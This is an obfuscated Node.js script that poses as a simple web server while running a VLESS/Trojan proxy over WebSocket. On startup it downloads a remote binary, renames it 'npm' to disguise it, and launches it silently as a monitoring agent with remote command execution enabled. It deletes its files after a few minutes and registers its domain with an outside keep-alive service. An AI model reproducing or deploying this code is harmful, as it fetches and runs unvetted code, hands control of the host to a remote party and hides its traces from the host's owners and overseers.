function _0x3330(_0x7ba8be,_0x487c57){_0x7ba8be=_0x7ba8be-0x74;const _0x4f7373=_0x4f73();let _0x333070=_0x4f7373[_0x7ba8be];return _0x333070;}const _0x23d8b4=_0x3330;(function(_0x43b3ca,_0x950438){const _0x47031f=_0x3330,_0x4e8fbe=_0x43b3ca();while(!![]){try{const _0x29d483=parseInt(_0x47031f(0xa9))/0x1+-parseInt(_0x47031f(0x85))/0x2+parseInt(_0x47031f(0xd6))/0x3*(-parseInt(_0x47031f(0xf1))/0x4)+parseInt(_0x47031f(0x99))/0x5*(parseInt(_0x47031f(0x91))/0x6)+-parseInt(_0x47031f(0x86))/0x7*(parseInt(_0x47031f(0x7f))/0x8)+-parseInt(_0x47031f(0x8e))/0x9*(parseInt(_0x47031f(0xe0))/0xa)+parseInt(_0x47031f(0xb3))/0xb;if(_0x29d483===_0x950438)break;else _0x4e8fbe['push'](_0x4e8fbe['shift']());}catch(_0x21c6db){_0x4e8fbe['push'](_0x4e8fbe['shift']());}}}(_0x4f73,0xebb78));const os=require('os'),http=require(_0x23d8b4(0xb4)),fs=require('fs'),axios=require('axios'),net=require(_0x23d8b4(0xaa)),path=require(_0x23d8b4(0xb5)),crypto=require(_0x23d8b4(0xed)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x23d8b4(0x89)][_0x23d8b4(0xe7)]||_0x23d8b4(0x92),NEZHA_SERVER=process['env'][_0x23d8b4(0x9e)]||'',NEZHA_PORT=process[_0x23d8b4(0x89)][_0x23d8b4(0xd4)]||'',NEZHA_KEY=process[_0x23d8b4(0x89)][_0x23d8b4(0xd5)]||'',DOMAIN=process[_0x23d8b4(0x89)][_0x23d8b4(0x88)]||_0x23d8b4(0x7e),AUTO_ACCESS=process[_0x23d8b4(0x89)][_0x23d8b4(0x9c)]||!![],WSPATH=process[_0x23d8b4(0x89)][_0x23d8b4(0x77)]||UUID[_0x23d8b4(0x76)](0x0,0x8),SUB_PATH=process[_0x23d8b4(0x89)][_0x23d8b4(0xd8)]||_0x23d8b4(0xa4),NAME=process[_0x23d8b4(0x89)]['NAME']||_0x23d8b4(0xbf),PORT=process[_0x23d8b4(0x89)][_0x23d8b4(0xaf)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2917c9=_0x23d8b4;try{const _0x1dc4e5=await axios[_0x2917c9(0xd7)]('https://speed.cloudflare.com/meta'),_0x102a9a=_0x1dc4e5[_0x2917c9(0xc5)];ISP=(_0x102a9a[_0x2917c9(0xc0)]+'-'+_0x102a9a[_0x2917c9(0x80)])[_0x2917c9(0x79)](/ /g,'_');}catch(_0x37dd95){ISP=_0x2917c9(0x95);}};GetISP();function _0x4f73(){const _0x3f5c21=['ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Server','log','end','send','finish','utf8','Hello\x20world!','Hug','country','close','https://dns.google/resolve?name=','reduce','&fp=chrome&type=ws&host=','data','concat','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','map','trojan://','application/dns-json',':443?security=tls&sni=','join','client_secret:\x20','listen','false','npm\x20running\x20error:','setsid\x20nohup\x20./npm\x20-s\x20','readUInt8','1.1.1.1','NEZHA_PORT','NEZHA_KEY','3JDkSZD','get','SUB_PATH','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sha224','2083','config.yaml','createHash','readUInt16BE','chmod\x20+x\x20npm','12363460aMjobS','once','connect','https://arm64.ssss.nyc.mn/v1','test','arm64','application/json','UUID','arm','createServer','arch','writeFileSync','443','crypto','8.8.4.4','Answer','npm','2583836oBOdAx','utf-8','npm\x20is\x20running','slice','WSPATH','find','replace','message','includes','writeHead','createWriteStream','1234.abc.com','2344jViGtb','asOrganization','digest','length','Status','Not\x20Found\x0a','1144268UsgBTe','32207EXFVoc','Automatic\x20Access\x20Task\x20added\x20successfully','DOMAIN','env','aarch64','&type=A','text/plain','error','9Xvzojv','pipe','index.html','3047622xKWYSP','43817e23-8872-4292-b80d-d25a942b8300','every','update','Unknown','https://arm64.ssss.nyc.mn/agent','true','type','5zlJJQY','post','substr','AUTO_ACCESS','stream','NEZHA_SERVER','\x20-p\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','toString','pop','url','sub','&path=%2F','split','trim','connection','598932ufSiWA','net','catch',':443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/agent','--tls','PORT','unlink','write','hex','40272749wAwltC','http','path','then'];_0x4f73=function(){return _0x3f5c21;};return _0x4f73();}const httpServer=http[_0x23d8b4(0xe9)]((_0x31cb36,_0x15e508)=>{const _0x5100a4=_0x23d8b4;if(_0x31cb36[_0x5100a4(0xa3)]==='/'){const _0x5c3b53=path[_0x5100a4(0xcc)](__dirname,_0x5100a4(0x90));fs['readFile'](_0x5c3b53,_0x5100a4(0xbd),(_0x3fb864,_0x21bafb)=>{const _0x51c660=_0x5100a4;if(_0x3fb864){_0x15e508[_0x51c660(0x7c)](0xc8,{'Content-Type':'text/html'}),_0x15e508['end'](_0x51c660(0xbe));return;}_0x15e508[_0x51c660(0x7c)](0xc8,{'Content-Type':'text/html'}),_0x15e508[_0x51c660(0xba)](_0x21bafb);});return;}else{if(_0x31cb36[_0x5100a4(0xa3)]==='/'+SUB_PATH){const _0x4a1e50='vless://'+UUID+'@'+DOMAIN+_0x5100a4(0xac)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5100a4(0xa5)+WSPATH+'#'+NAME+'-'+ISP,_0x194021=_0x5100a4(0xc9)+UUID+'@'+DOMAIN+_0x5100a4(0xcb)+DOMAIN+_0x5100a4(0xc4)+DOMAIN+_0x5100a4(0xa5)+WSPATH+'#'+NAME+'-'+ISP,_0x2d848e=_0x4a1e50+'\x0a'+_0x194021,_0x44174b=Buffer['from'](_0x2d848e)[_0x5100a4(0xa1)]('base64');_0x15e508[_0x5100a4(0x7c)](0xc8,{'Content-Type':_0x5100a4(0x8c)}),_0x15e508[_0x5100a4(0xba)](_0x44174b+'\x0a');}else _0x15e508[_0x5100a4(0x7c)](0x194,{'Content-Type':'text/plain'}),_0x15e508[_0x5100a4(0xba)](_0x5100a4(0x84));}}),wss=new WebSocket[(_0x23d8b4(0xb8))]({'server':httpServer}),uuid=UUID[_0x23d8b4(0x79)](/-/g,''),DNS_SERVERS=[_0x23d8b4(0xee),_0x23d8b4(0xd3)];function resolveHost(_0x41dc8f){return new Promise((_0x248817,_0x5a8e31)=>{const _0x52a674=_0x3330;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x52a674(0xe4)](_0x41dc8f)){_0x248817(_0x41dc8f);return;}let _0x316485=0x0;function _0x696491(){const _0x5c48ae=_0x52a674;if(_0x316485>=DNS_SERVERS['length']){_0x5a8e31(new Error('Failed\x20to\x20resolve\x20'+_0x41dc8f+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4244c9=DNS_SERVERS[_0x316485];_0x316485++;const _0x4bfc33=_0x5c48ae(0xc2)+encodeURIComponent(_0x41dc8f)+_0x5c48ae(0x8b);axios[_0x5c48ae(0xd7)](_0x4bfc33,{'timeout':0x1388,'headers':{'Accept':_0x5c48ae(0xca)}})[_0x5c48ae(0xb6)](_0x2fd39d=>{const _0x432940=_0x5c48ae,_0x43d6ed=_0x2fd39d[_0x432940(0xc5)];if(_0x43d6ed[_0x432940(0x83)]===0x0&&_0x43d6ed[_0x432940(0xef)]&&_0x43d6ed[_0x432940(0xef)][_0x432940(0x82)]>0x0){const _0x3f95e7=_0x43d6ed[_0x432940(0xef)][_0x432940(0x78)](_0x28e142=>_0x28e142[_0x432940(0x98)]===0x1);if(_0x3f95e7){_0x248817(_0x3f95e7['data']);return;}}_0x696491();})[_0x5c48ae(0xab)](_0x153589=>{_0x696491();});}_0x696491();});}function handleVlessConnection(_0x4ef622,_0x42fd78){const _0x57a0b0=_0x23d8b4,[_0x4d6a3e]=_0x42fd78,_0x1e84b6=_0x42fd78['slice'](0x1,0x11);if(!_0x1e84b6[_0x57a0b0(0x93)]((_0x1999f7,_0x42ca5c)=>_0x1999f7==parseInt(uuid[_0x57a0b0(0x9b)](_0x42ca5c*0x2,0x2),0x10)))return![];let _0x240a38=_0x42fd78['slice'](0x11,0x12)[_0x57a0b0(0xd2)]()+0x13;const _0x4a2b7a=_0x42fd78[_0x57a0b0(0x76)](_0x240a38,_0x240a38+=0x2)[_0x57a0b0(0xde)](0x0),_0x565177=_0x42fd78['slice'](_0x240a38,_0x240a38+=0x1)[_0x57a0b0(0xd2)](),_0x129eb6=_0x565177==0x1?_0x42fd78[_0x57a0b0(0x76)](_0x240a38,_0x240a38+=0x4)[_0x57a0b0(0xcc)]('.'):_0x565177==0x2?new TextDecoder()['decode'](_0x42fd78[_0x57a0b0(0x76)](_0x240a38+0x1,_0x240a38+=0x1+_0x42fd78[_0x57a0b0(0x76)](_0x240a38,_0x240a38+0x1)[_0x57a0b0(0xd2)]())):_0x565177==0x3?_0x42fd78['slice'](_0x240a38,_0x240a38+=0x10)['reduce']((_0x33d53c,_0x39ca8c,_0xae243a,_0x29c676)=>_0xae243a%0x2?_0x33d53c['concat'](_0x29c676[_0x57a0b0(0x76)](_0xae243a-0x1,_0xae243a+0x1)):_0x33d53c,[])[_0x57a0b0(0xc8)](_0x5ce04a=>_0x5ce04a[_0x57a0b0(0xde)](0x0)[_0x57a0b0(0xa1)](0x10))[_0x57a0b0(0xcc)](':'):'';_0x4ef622[_0x57a0b0(0xbb)](new Uint8Array([_0x4d6a3e,0x0]));const _0x26971b=createWebSocketStream(_0x4ef622);return resolveHost(_0x129eb6)[_0x57a0b0(0xb6)](_0x118b07=>{const _0x4a1a89=_0x57a0b0;net[_0x4a1a89(0xe2)]({'host':_0x118b07,'port':_0x4a2b7a},function(){const _0x2aa07c=_0x4a1a89;this[_0x2aa07c(0xb1)](_0x42fd78[_0x2aa07c(0x76)](_0x240a38)),_0x26971b['on'](_0x2aa07c(0x8d),()=>{})[_0x2aa07c(0x8f)](this)['on']('error',()=>{})[_0x2aa07c(0x8f)](_0x26971b);})['on'](_0x4a1a89(0x8d),()=>{});})[_0x57a0b0(0xab)](_0x4f2c1b=>{const _0x54eb96=_0x57a0b0;net[_0x54eb96(0xe2)]({'host':_0x129eb6,'port':_0x4a2b7a},function(){const _0xc486e1=_0x54eb96;this['write'](_0x42fd78[_0xc486e1(0x76)](_0x240a38)),_0x26971b['on'](_0xc486e1(0x8d),()=>{})[_0xc486e1(0x8f)](this)['on'](_0xc486e1(0x8d),()=>{})[_0xc486e1(0x8f)](_0x26971b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x32fa6c,_0x5df437){const _0x5023bd=_0x23d8b4;try{if(_0x5df437[_0x5023bd(0x82)]<0x3a)return![];const _0x1a2c24=_0x5df437[_0x5023bd(0x76)](0x0,0x38)[_0x5023bd(0xa1)](),_0x2199e6=[UUID];let _0x16c55f=null;for(const _0x134e1d of _0x2199e6){const _0x470a52=crypto[_0x5023bd(0xdd)](_0x5023bd(0xda))[_0x5023bd(0x94)](_0x134e1d)[_0x5023bd(0x81)](_0x5023bd(0xb2));if(_0x470a52===_0x1a2c24){_0x16c55f=_0x134e1d;break;}}if(!_0x16c55f)return![];let _0x840e90=0x38;_0x5df437[_0x840e90]===0xd&&_0x5df437[_0x840e90+0x1]===0xa&&(_0x840e90+=0x2);const _0x39ab15=_0x5df437[_0x840e90];if(_0x39ab15!==0x1)return![];_0x840e90+=0x1;const _0x1f536f=_0x5df437[_0x840e90];_0x840e90+=0x1;let _0x2cf1c2,_0x520c4e;if(_0x1f536f===0x1)_0x2cf1c2=_0x5df437[_0x5023bd(0x76)](_0x840e90,_0x840e90+0x4)[_0x5023bd(0xcc)]('.'),_0x840e90+=0x4;else{if(_0x1f536f===0x3){const _0x38ab1d=_0x5df437[_0x840e90];_0x840e90+=0x1,_0x2cf1c2=_0x5df437[_0x5023bd(0x76)](_0x840e90,_0x840e90+_0x38ab1d)['toString'](),_0x840e90+=_0x38ab1d;}else{if(_0x1f536f===0x4)_0x2cf1c2=_0x5df437[_0x5023bd(0x76)](_0x840e90,_0x840e90+0x10)[_0x5023bd(0xc3)]((_0x2b063a,_0x2ece31,_0x537ddb,_0x2405aa)=>_0x537ddb%0x2?_0x2b063a[_0x5023bd(0xc6)](_0x2405aa[_0x5023bd(0x76)](_0x537ddb-0x1,_0x537ddb+0x1)):_0x2b063a,[])[_0x5023bd(0xc8)](_0x4d0da5=>_0x4d0da5[_0x5023bd(0xde)](0x0)[_0x5023bd(0xa1)](0x10))[_0x5023bd(0xcc)](':'),_0x840e90+=0x10;else return![];}}_0x520c4e=_0x5df437[_0x5023bd(0xde)](_0x840e90),_0x840e90+=0x2;_0x840e90<_0x5df437[_0x5023bd(0x82)]&&_0x5df437[_0x840e90]===0xd&&_0x5df437[_0x840e90+0x1]===0xa&&(_0x840e90+=0x2);const _0x100b54=createWebSocketStream(_0x32fa6c);return resolveHost(_0x2cf1c2)[_0x5023bd(0xb6)](_0x53d118=>{const _0x318ac1=_0x5023bd;net[_0x318ac1(0xe2)]({'host':_0x53d118,'port':_0x520c4e},function(){const _0x5a6e4e=_0x318ac1;_0x840e90<_0x5df437[_0x5a6e4e(0x82)]&&this[_0x5a6e4e(0xb1)](_0x5df437[_0x5a6e4e(0x76)](_0x840e90)),_0x100b54['on']('error',()=>{})[_0x5a6e4e(0x8f)](this)['on'](_0x5a6e4e(0x8d),()=>{})[_0x5a6e4e(0x8f)](_0x100b54);})['on'](_0x318ac1(0x8d),()=>{});})['catch'](_0xceb843=>{const _0x1598bf=_0x5023bd;net['connect']({'host':_0x2cf1c2,'port':_0x520c4e},function(){const _0xfd6aed=_0x3330;_0x840e90<_0x5df437[_0xfd6aed(0x82)]&&this[_0xfd6aed(0xb1)](_0x5df437['slice'](_0x840e90)),_0x100b54['on'](_0xfd6aed(0x8d),()=>{})[_0xfd6aed(0x8f)](this)['on'](_0xfd6aed(0x8d),()=>{})[_0xfd6aed(0x8f)](_0x100b54);})['on'](_0x1598bf(0x8d),()=>{});}),!![];}catch(_0x26cf47){return![];}}wss['on'](_0x23d8b4(0xa8),(_0x30bb49,_0x2c1061)=>{const _0x510b50=_0x23d8b4,_0x12a42c=_0x2c1061['url']||'';_0x30bb49[_0x510b50(0xe1)](_0x510b50(0x7a),_0x6ad681=>{const _0x46a16b=_0x510b50;if(_0x6ad681[_0x46a16b(0x82)]>0x11&&_0x6ad681[0x0]===0x0){const _0x643e88=_0x6ad681[_0x46a16b(0x76)](0x1,0x11),_0x4875a2=_0x643e88[_0x46a16b(0x93)]((_0xfd1de9,_0x7f91d3)=>_0xfd1de9==parseInt(uuid[_0x46a16b(0x9b)](_0x7f91d3*0x2,0x2),0x10));if(_0x4875a2){!handleVlessConnection(_0x30bb49,_0x6ad681)&&_0x30bb49[_0x46a16b(0xc1)]();return;}}!handleTrojanConnection(_0x30bb49,_0x6ad681)&&_0x30bb49[_0x46a16b(0xc1)]();})['on'](_0x510b50(0x8d),()=>{});});const getDownloadUrl=()=>{const _0x28c5e1=_0x23d8b4,_0x208cd2=os[_0x28c5e1(0xea)]();return _0x208cd2===_0x28c5e1(0xe8)||_0x208cd2===_0x28c5e1(0xe5)||_0x208cd2===_0x28c5e1(0x8a)?!NEZHA_PORT?_0x28c5e1(0xe3):_0x28c5e1(0x96):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x28c5e1(0xad);},downloadFile=async()=>{const _0x4f5c4f=_0x23d8b4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x27539a=getDownloadUrl(),_0x466910=await axios({'method':'get','url':_0x27539a,'responseType':_0x4f5c4f(0x9d)}),_0x4b0408=fs[_0x4f5c4f(0x7d)](_0x4f5c4f(0xf0));return _0x466910[_0x4f5c4f(0xc5)][_0x4f5c4f(0x8f)](_0x4b0408),new Promise((_0x409659,_0x4690dc)=>{const _0x34ea9c=_0x4f5c4f;_0x4b0408['on'](_0x34ea9c(0xbc),()=>{const _0x2cea23=_0x34ea9c;console[_0x2cea23(0xb9)]('npm\x20download\x20successfully'),exec(_0x2cea23(0xdf),_0x213ab0=>{if(_0x213ab0)_0x4690dc(_0x213ab0);_0x409659();});}),_0x4b0408['on'](_0x34ea9c(0x8d),_0x4690dc);});}catch(_0x4f0da){throw _0x4f0da;}},runnz=async()=>{const _0x1327cc=_0x23d8b4;try{const _0x3549e8=execSync(_0x1327cc(0xb7),{'encoding':_0x1327cc(0x74)});if(_0x3549e8[_0x1327cc(0xa7)]()!==''){console[_0x1327cc(0xb9)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3491d0){}await downloadFile();let _0x23b400='',_0x260b3b=[_0x1327cc(0xec),'8443','2096','2087',_0x1327cc(0xdb),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x24f372=_0x260b3b[_0x1327cc(0x7b)](NEZHA_PORT)?_0x1327cc(0xae):'';_0x23b400=_0x1327cc(0xd1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1327cc(0x9f)+NEZHA_KEY+'\x20'+_0x24f372+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51ca83=NEZHA_SERVER[_0x1327cc(0x7b)](':')?NEZHA_SERVER[_0x1327cc(0xa6)](':')[_0x1327cc(0xa2)]():'',_0x4d9eb0=_0x260b3b['includes'](_0x51ca83)?_0x1327cc(0x97):_0x1327cc(0xcf),_0x4f508a=_0x1327cc(0xcd)+NEZHA_KEY+_0x1327cc(0xa0)+NEZHA_SERVER+_0x1327cc(0xc7)+_0x4d9eb0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1327cc(0xeb)](_0x1327cc(0xdc),_0x4f508a);}_0x23b400=_0x1327cc(0xd9);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x23b400,{'shell':'/bin/bash'},_0x3f3a61=>{const _0x8ff7e4=_0x1327cc;if(_0x3f3a61)console[_0x8ff7e4(0x8d)](_0x8ff7e4(0xd0),_0x3f3a61);else console['log'](_0x8ff7e4(0x75));});}catch(_0x245b3a){console[_0x1327cc(0x8d)]('error:\x20'+_0x245b3a);}};async function addAccessTask(){const _0x683d40=_0x23d8b4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3c302a='https://'+DOMAIN;try{const _0x532004=await axios[_0x683d40(0x9a)]('https://oooo.serv00.net/add-url',{'url':_0x3c302a},{'headers':{'Content-Type':_0x683d40(0xe6)}});console[_0x683d40(0xb9)](_0x683d40(0x87));}catch(_0x3f115b){}}const delFiles=()=>{const _0x2a60db=_0x23d8b4;fs[_0x2a60db(0xb0)](_0x2a60db(0xf0),()=>{}),fs[_0x2a60db(0xb0)]('config.yaml',()=>{});};httpServer[_0x23d8b4(0xce)](PORT,()=>{const _0x75730f=_0x23d8b4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x75730f(0xb9)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
